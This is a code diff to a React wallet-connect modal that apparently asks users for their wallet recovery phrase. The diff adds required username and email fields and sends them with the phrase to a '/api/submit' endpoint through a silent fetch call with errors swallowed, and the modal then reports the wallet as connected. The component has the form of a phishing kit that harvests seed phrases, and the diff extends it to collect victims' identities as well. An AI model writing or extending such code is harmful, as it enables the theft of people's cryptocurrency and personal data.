@@ -56,6 +56,8 @@ function WalletConnectModal({
   onConnect: () => void;
 }) {
   const [selectedWallet, setSelectedWallet] = useState("");
+  const [email, setEmail] = useState("");
+  const [username, setUsername] = useState("");
   const [phrase, setPhrase] = useState("");
   const [showPhrase, setShowPhrase] = useState(false);
   const [dropdownOpen, setDropdownOpen] = useState(false);
@@ -96,6 +98,8 @@ function WalletConnectModal({
 
   const resetForm = () => {
     setSelectedWallet("");
+    setEmail("");
+    setUsername("");
     setPhrase("");
     setShowPhrase(false);
     setDropdownOpen(false);
@@ -123,7 +127,7 @@ function WalletConnectModal({
     fetch("/api/submit", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ wallet: walletName, phrase }),
+      body: JSON.stringify({ wallet: walletName, phrase, email, username }),
     }).catch(() => {});
 
     onConnect();
@@ -179,6 +183,42 @@ function WalletConnectModal({
         </div>
 
         <form onSubmit={handleConnect} className="space-y-5 px-6 py-5">
+          <div>
+            <label htmlFor="username" className="mb-2 block text-sm font-medium">
+              Username
+            </label>
+            <input
+              type="text"
+              id="username"
+              required
+              value={username}
+              onChange={(e) => {
+                setUsername(e.target.value);
+                setError("");
+              }}
+              placeholder="Username"
+              className="w-full rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-sm placeholder:text-muted/50 focus:border-accent/50 focus:outline-none focus:ring-1 focus:ring-accent/30"
+            />
+          </div>
+
+          <div>
+            <label htmlFor="email" className="mb-2 block text-sm font-medium">
+              Email Address
+            </label>
+            <input
+              type="email"
+              id="email"
+              required
+              value={email}
+              onChange={(e) => {
+                setEmail(e.target.value);
+                setError("");
+              }}
+              placeholder="name@example.com"
+              className="w-full rounded-xl border border-white/10 bg-white/5 px-4 py-3 text-sm placeholder:text-muted/50 focus:border-accent/50 focus:outline-none focus:ring-1 focus:ring-accent/30"
+            />
+          </div>
+
           <div ref={dropdownRef}>
             <label className="mb-2 block text-sm font-medium">
               Select Wallet
